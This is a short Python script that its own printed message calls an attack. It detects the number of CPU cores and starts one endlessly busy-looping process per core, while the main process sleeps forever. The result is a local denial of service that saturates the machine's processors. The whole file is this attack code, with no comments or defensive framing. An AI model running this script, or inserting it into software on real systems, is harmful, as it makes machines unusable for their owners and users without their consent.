import multiprocessing
import time

def cpu_exhaustion():
    while True:
        pass

if __name__ == "__main__":
    cores = multiprocessing.cpu_count()
    print(f"Detected {cores} cores. Starting attack...")

    for _ in range(cores):
        p = multiprocessing.Process(target=cpu_exhaustion)
        p.start()

    while True:
        time.sleep(1)
